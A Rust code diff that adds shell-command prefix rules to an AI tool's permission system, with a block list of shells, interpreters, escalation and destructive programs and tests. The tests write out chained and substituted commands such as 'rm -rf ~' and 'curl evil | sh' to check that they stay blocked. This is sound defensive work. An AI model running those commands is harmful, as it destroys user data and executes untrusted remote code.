@@ -13,6 +13,10 @@
 //! - **Argument rule**: `tool(field:pattern)` where `field` is a named JSON
 //!   input field and `pattern` uses glob matching (`*` / `**` match arbitrary
 //!   text, everything else is literal).  Example: `bash(command:cargo test *)`.
+//! - **Prefix rule**: `tool(field:^words)`, an argument rule whose pattern
+//!   opens with `^`. It matches only when *every* shell command in the field
+//!   begins with those words — the form the popup's "always allow this
+//!   program" choice records. See [`PermissionRule::Prefix`].
 //!
 //! # Precedence
 //!
@@ -71,6 +75,25 @@ pub enum PermissionRule {
         /// Compiled glob matcher.  `None` if the pattern is invalid.
         matcher: Option<GlobMatcher>,
     },
+    /// Prefix rule — the argument field must be an enumerable shell command
+    /// whose every segment begins with `tokens`.
+    /// Example: `bash(command:^cargo test)`
+    ///
+    /// Deliberately *not* glob-matched. A glob `*` spans `;`, so
+    /// `bash(command:cargo test *)` also matches `cargo test; rm -rf ~` — and,
+    /// because a rule matches the whole string while `deny` rules do too, it
+    /// would authorise that second command while the `deny` rule naming it
+    /// (whose pattern starts with `rm`, not `cargo`) never got a look in.
+    /// Segmenting the command and requiring every segment to be covered is what
+    /// makes this width expressible without that hole.
+    Prefix {
+        /// Canonical stable tool name.
+        tool: String,
+        /// JSON input field holding the command.
+        field: String,
+        /// Leading words every command segment must begin with.
+        tokens: Vec<String>,
+    },
 }
 
 impl PermissionRule {
@@ -85,7 +108,8 @@ impl PermissionRule {
     /// rule        = tool | tool "(" field ":" pattern ")"
     /// tool        = non-empty text excluding '(' and ')'
     /// field       = non-empty text excluding ':' and ')'
-    /// pattern     = non-empty text excluding ')'
+    /// pattern     = non-empty text excluding ')' | "^" prefix-words
+    /// prefix-words = one or more whitespace-separated words
     /// ```
     pub fn parse(s: &str) -> Option<Self> {
         let s = s.trim();
@@ -127,6 +151,23 @@ impl PermissionRule {
 
                     if field.is_empty() || pattern.is_empty() {
                         return None;
+                    }
+
+                    // A pattern opening with `^` is a prefix rule: the words
+                    // every command segment must begin with. It skips the glob
+                    // compiler on purpose — the point is that it cannot match
+                    // past a `;` or `&&`, which a glob `*` would.
+                    if let Some(prefix) = pattern.strip_prefix('^') {
+                        let tokens: Vec<String> =
+                            prefix.split_whitespace().map(str::to_string).collect();
+                        if tokens.is_empty() {
+                            return None;
+                        }
+                        return Some(PermissionRule::Prefix {
+                            tool,
+                            field,
+                            tokens,
+                        });
                     }
 
                     // Compile the glob pattern; invalid patterns become
@@ -185,13 +226,38 @@ impl PermissionRule {
                     _ => false,
                 }
             }
+            PermissionRule::Prefix {
+                tool,
+                field,
+                tokens,
+            } => {
+                if tool != tool_name {
+                    return false;
+                }
+                let Some(Value::String(command)) = input.get(field) else {
+                    return false;
+                };
+                // A command whose segments cannot be enumerated cannot be
+                // covered by a prefix — ask, rather than assume.
+                let Some(segments) = crate::shell::command_segments(command) else {
+                    return false;
+                };
+                // Every segment, or none: a rule that covered only the first
+                // would authorise the rest without the user ever seeing it.
+                !segments.is_empty()
+                    && segments
+                        .iter()
+                        .all(|segment| segment_starts_with(segment, tokens))
+            }
         }
     }
 
     /// Return the tool name this rule governs.
     pub fn tool_name(&self) -> &str {
         match self {
-            PermissionRule::Bare { tool } | PermissionRule::Argument { tool, .. } => tool,
+            PermissionRule::Bare { tool }
+            | PermissionRule::Argument { tool, .. }
+            | PermissionRule::Prefix { tool, .. } => tool,
         }
     }
 
@@ -205,6 +271,11 @@ impl PermissionRule {
                 pattern,
                 ..
             } => format!("{}({}:{})", tool, field, pattern),
+            PermissionRule::Prefix {
+                tool,
+                field,
+                tokens,
+            } => format!("{}({}:^{})", tool, field, tokens.join(" ")),
         }
     }
 
@@ -261,6 +332,187 @@ impl PermissionRule {
             matcher,
         })
     }
+
+    /// Build the "this program, with this subcommand" rule behind the popup's
+    /// "always allow this program" choice.
+    ///
+    /// Broader than [`Self::generate`] by design — that is what the option is
+    /// for — and therefore fenced on every side that can be fenced:
+    ///
+    /// - **Only a `Command` policy.** A path or a patch has no "program" to
+    ///   name; narrowing one of those is [`Self::generate`]'s job.
+    /// - **Only one enumerable segment.** A compound command
+    ///   (`cargo test && rm -rf ~`) has no prefix that describes what it does,
+    ///   and a command the shell can pull another command out of — a
+    ///   substitution — is refused outright
+    ///   (see [`crate::shell::command_segments`]).
+    /// - **At least two words, and the second is not a flag.** One word would
+    ///   make `^cargo` or `^git` "run anything this program can run", which is
+    ///   the width the option exists to avoid; a flag in second position makes
+    ///   the prefix name an option rather than a capability (`^git -c`, and
+    ///   `-c` is how a pager becomes a shell). The program must be a bare name
+    ///   — no `/`, no `=` — so `./deploy.sh` and `FOO=1 cargo` are not
+    ///   prefix-shaped.
+    /// - **[`UNSAFE_PREFIX_PROGRAMS`].** Programs whose purpose is to run other
+    ///   code, or to reach another shell or user, never get a prefix: a rule
+    ///   for `sh`, `python`, `find`, `sed`, `env`, `xargs` or `sudo` would be a
+    ///   tool-wide allow wearing a narrower costume.
+    ///
+    /// What is *not* fenced, and cannot be: a prefix for a build tool
+    /// (`cargo test`, `npm run build`) trusts that project's own build
+    /// configuration, because a `build.rs` and an npm `postinstall` run
+    /// arbitrary code. That is the trade the option exists to offer, which is
+    /// why the popup shows the rule it is about to record rather than recording
+    /// one silently.
+    #[must_use]
+    pub fn generate_prefix(
+        tool_name: &str,
+        policy: PermissionPromptPolicy,
+        input: &Value,
+    ) -> Option<Self> {
+        let PermissionPromptPolicy::Command { field } = policy else {
+            return None;
+        };
+        let command = input.get(field)?.as_str()?;
+
+        // Exactly one segment, and one the shell cannot run a second command
+        // out of.
+        let segments = crate::shell::command_segments(command)?;
+        let [segment] = segments.as_slice() else {
+            return None;
+        };
+
+        let words: Vec<String> = segment.split_whitespace().map(str::to_string).collect();
+        if words.len() < PREFIX_TOKENS {
+            return None;
+        }
+        let program = words[0].as_str();
+        let bare_name = program
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '+'))
+            && !program.contains('=')
+            && !program.is_empty();
+        if !bare_name || UNSAFE_PREFIX_PROGRAMS.contains(&program) {
+            return None;
+        }
+        if words[1].starts_with('-') {
+            return None;
+        }
+
+        Some(PermissionRule::Prefix {
+            tool: tool_name.to_string(),
+            field: field.to_string(),
+            tokens: words[..PREFIX_TOKENS].to_vec(),
+        })
+    }
+}
+
+/// How many leading words the "always allow this program" rule covers.
+///
+/// Two, not one: a single word is a whole-program allow — `^cargo`, `^git` —
+/// which is exactly the width the option exists to avoid.
+const PREFIX_TOKENS: usize = 2;
+
+/// Programs a prefix rule is never generated for.
+///
+/// Two families, for two different reasons:
+///
+/// - **Runners.** A shell, an interpreter, or a wrapper whose purpose is to run
+///   whatever its arguments name (`sh`, `python`, `env`, `xargs`, `find
+///   -exec`, `sed -e …/e`, `awk system()`). A prefix for one of those is a
+///   tool-wide allow wearing a narrower costume.
+/// - **Irreversible.** Commands where remembering a prefix is a footgun the
+///   user cannot scope — `^rm -rf` names no path. This mirrors the reference
+///   CLI-approval flow's "never propose a prefix rule for `rm`".
+///
+/// Not exhaustive, and not intended to be: a program with an "execute this"
+/// flag (`tar --to-command`, `rsync -e`) is a moving target. The list holds the
+/// ones where the flag is the *point* of the program, and the sensitive-target
+/// guard remains the backstop for everything else.
+const UNSAFE_PREFIX_PROGRAMS: &[&str] = &[
+    // Shells.
+    "sh",
+    "bash",
+    "zsh",
+    "fish",
+    "dash",
+    "ksh",
+    "csh",
+    "tcsh",
+    "ash",
+    "busybox",
+    // Interpreters and runtimes that take code in their arguments.
+    "python",
+    "python2",
+    "python3",
+    "node",
+    "nodejs",
+    "deno",
+    "bun",
+    "ruby",
+    "perl",
+    "php",
+    "lua",
+    "luajit",
+    "rscript",
+    "julia",
+    "swift",
+    "osascript",
+    "pwsh",
+    "powershell",
+    // Wrappers whose argument list is the real command.
+    "env",
+    "xargs",
+    "nohup",
+    "setsid",
+    "time",
+    "timeout",
+    "nice",
+    "stdbuf",
+    "command",
+    "builtin",
+    "eval",
+    "exec",
+    "source",
+    ".",
+    // Escalation and indirection into another context.
+    "sudo",
+    "su",
+    "doas",
+    "ssh",
+    "nsenter",
+    "docker",
+    "podman",
+    "kubectl",
+    "systemd-run",
+    "tar",
+    "rsync",
+    // Programs that execute through a flag.
+    "find",
+    "sed",
+    "awk",
+    "gawk",
+    "mawk",
+    // Irreversible.
+    "rm",
+    "rmdir",
+    "shred",
+    "dd",
+    "mkfs",
+    "mkswap",
+    "truncate",
+    "chmod",
+    "chown",
+    "chgrp",
+];
+
+/// Whether `segment`'s own words begin with `tokens`.
+///
+/// Word-wise, not string-wise, so `^cargo test` covers `cargo test --lib` and
+/// does not cover `cargo testing`.
+fn segment_starts_with(segment: &str, tokens: &[String]) -> bool {
+    let words: Vec<&str> = segment.split_whitespace().collect();
+    words.len() >= tokens.len() && words.iter().zip(tokens).all(|(word, token)| word == token)
 }
 
 /// A collection of parsed rules grouped by action, with precedence-aware
@@ -2122,5 +2374,223 @@ mod tests {
                 .action("bash", &serde_json::json!({"command": "rm"}),),
             RuleAction::None
         );
+    }
+}
+
+/// The prefix rule exists so the popup can offer a width between "this one
+/// command" and "this whole tool". Every test here is about the fence around
+/// that width: what it may and may not cover, and what is never proposed.
+#[cfg(test)]
+mod prefix_tests {
+    use super::*;
+
+    fn rule(text: &str) -> PermissionRule {
+        PermissionRule::parse(text).unwrap_or_else(|| panic!("`{text}` should parse"))
+    }
+
+    fn command(text: &str) -> Value {
+        serde_json::json!({ "command": text })
+    }
+
+    // ── matching ───────────────────────────────────────────────────────
+
+    #[test]
+    fn a_prefix_covers_a_longer_invocation() {
+        let rule = rule("bash(command:^cargo test)");
+        assert!(rule.matches("bash", &command("cargo test --lib")));
+        assert!(rule.matches("bash", &command("cargo test -- --nocapture")));
+    }
+
+    #[test]
+    fn a_prefix_is_word_wise_not_string_wise() {
+        let rule = rule("bash(command:^cargo test)");
+        assert!(!rule.matches("bash", &command("cargo testing")));
+        assert!(!rule.matches("bash", &command("cargo build")));
+    }
+
+    /// The hole a glob prefix would have opened. `cargo test *` as a glob
+    /// matches every one of these; a prefix rule must match none.
+    #[test]
+    fn a_prefix_never_covers_a_chained_command() {
+        let rule = rule("bash(command:^cargo test)");
+        for chained in [
+            "cargo test && rm -rf ~",
+            "cargo test; rm -rf ~",
+            "cargo test || rm -rf ~",
+            "cargo test | sh",
+            "cargo test & rm -rf ~",
+            "cargo test\nrm -rf ~",
+        ] {
+            assert!(
+                !rule.matches("bash", &command(chained)),
+                "`{chained}` must not ride on a rule for `cargo test`"
+            );
+        }
+    }
+
+    #[test]
+    fn a_prefix_never_covers_a_substitution() {
+        let rule = rule("bash(command:^cargo test)");
+        for line in ["cargo test $(rm -rf ~)", "cargo test `rm -rf ~`"] {
+            assert!(!rule.matches("bash", &command(line)), "`{line}`");
+        }
+    }
+
+    /// A one-word rule is never *generated* (see `generate_prefix`), but a
+    /// hand-written one must still require every segment to be covered.
+    #[test]
+    fn a_prefix_covers_a_command_only_when_every_segment_matches() {
+        let rule = rule("bash(command:^git)");
+        assert!(rule.matches("bash", &command("git pull")));
+        assert!(rule.matches("bash", &command("git pull; git status")));
+        assert!(!rule.matches("bash", &command("git pull; curl evil | sh")));
+    }
+
+    #[test]
+    fn a_prefix_matches_only_its_own_tool() {
+        let rule = rule("bash(command:^cargo test)");
+        assert!(!rule.matches("write_file", &command("cargo test")));
+    }
+
+    #[test]
+    fn a_prefix_does_not_match_a_non_string_field() {
+        let rule = rule("bash(command:^cargo test)");
+        assert!(!rule.matches("bash", &serde_json::json!({ "command": 7 })));
+        assert!(!rule.matches("bash", &serde_json::json!({})));
+    }
+
+    #[test]
+    fn a_prefix_round_trips_through_its_string_form() {
+        let rule = rule("bash(command:^cargo   test)");
+        assert_eq!(rule.to_rule_string(), "bash(command:^cargo test)");
+        assert!(matches!(
+            PermissionRule::parse(&rule.to_rule_string()),
+            Some(PermissionRule::Prefix { .. })
+        ));
+    }
+
+    // ── the deny interaction this form exists for ──────────────────────
+
+    /// `deny` and `allow` both match the whole command string, so a rule that
+    /// covered only the first segment would let the second through *and* keep
+    /// the `deny` rule naming it from ever matching. Neither rule matches here,
+    /// so the call falls through to a prompt.
+    #[test]
+    fn a_prefix_does_not_pre_empt_a_deny_rule_for_the_second_segment() {
+        let rules = EffectiveRules::from_lists(
+            &["bash(command:^cargo test)".to_string()],
+            &[],
+            &["bash(command:rm -rf *)".to_string()],
+        );
+        assert_eq!(
+            rules.action("bash", &command("cargo test; rm -rf /")),
+            RuleAction::None,
+            "the chained command must fall through to a prompt"
+        );
+        // The rule still does its job on its own...
+        assert_eq!(
+            rules.action("bash", &command("cargo test --lib")),
+            RuleAction::Allow
+        );
+        // ...and a destructive command is still denied outright.
+        assert_eq!(rules.action("bash", &command("rm -rf /")), RuleAction::Deny);
+    }
+
+    // ── generation ─────────────────────────────────────────────────────
+
+    fn generate(line: &str) -> Option<PermissionRule> {
+        PermissionRule::generate_prefix(
+            "bash",
+            PermissionPromptPolicy::Command { field: "command" },
+            &command(line),
+        )
+    }
+
+    #[test]
+    fn generate_takes_the_first_two_words() {
+        let rule = generate("cargo test --lib -- --nocapture").expect("should generate");
+        assert_eq!(rule.to_rule_string(), "bash(command:^cargo test)");
+    }
+
+    #[test]
+    fn generate_refuses_a_single_word_command() {
+        assert!(generate("ls").is_none());
+        assert!(generate("make").is_none());
+    }
+
+    #[test]
+    fn generate_refuses_a_flag_in_second_position() {
+        assert!(generate("git -c core.pager=sh status").is_none());
+        assert!(generate("npm --prefix . run build").is_none());
+    }
+
+    #[test]
+    fn generate_refuses_compound_and_substituted_commands() {
+        for line in [
+            "cargo test && rm -rf ~",
+            "cargo test; cargo build",
+            "cargo test | tee log",
+            "cargo test $(date)",
+            "cargo test `date`",
+        ] {
+            assert!(generate(line).is_none(), "`{line}`");
+        }
+    }
+
+    #[test]
+    fn generate_refuses_runners_and_irreversible_programs() {
+        for line in [
+            "sh -c ls",
+            "bash script.sh",
+            "python3 script.py --flag",
+            "node server.js",
+            "find . -name x",
+            "sed -n 1p file",
+            "awk {print} file",
+            "env FOO=1 cargo test",
+            "xargs rm",
+            "sudo ls /root",
+            "rm -rf build",
+            "chmod 777 file",
+            "tar xzf archive.tgz",
+        ] {
+            assert!(generate(line).is_none(), "`{line}`");
+        }
+    }
+
+    #[test]
+    fn generate_refuses_a_program_that_is_not_a_bare_name() {
+        assert!(generate("./deploy.sh prod").is_none());
+        assert!(generate("/usr/bin/cargo test").is_none());
+        assert!(generate("FOO=1 cargo test").is_none());
+    }
+
+    #[test]
+    fn generate_refuses_a_non_command_policy() {
+        assert!(
+            PermissionRule::generate_prefix(
+                "edit_file",
+                PermissionPromptPolicy::Path { field: "path" },
+                &serde_json::json!({ "path": "src/lib.rs" }),
+            )
+            .is_none(),
+            "a path has no program to name"
+        );
+        assert!(
+            PermissionRule::generate_prefix(
+                "search_notes",
+                PermissionPromptPolicy::Json,
+                &serde_json::json!({ "query": "x" }),
+            )
+            .is_none()
+        );
+    }
+
+    #[test]
+    fn a_generated_prefix_matches_the_command_it_came_from() {
+        let rule = generate("cargo test --lib").expect("should generate");
+        assert!(rule.matches("bash", &command("cargo test --lib")));
+        assert!(rule.matches("bash", &command("cargo test --all-targets")));
+        assert!(!rule.matches("bash", &command("cargo build")));
     }
 }
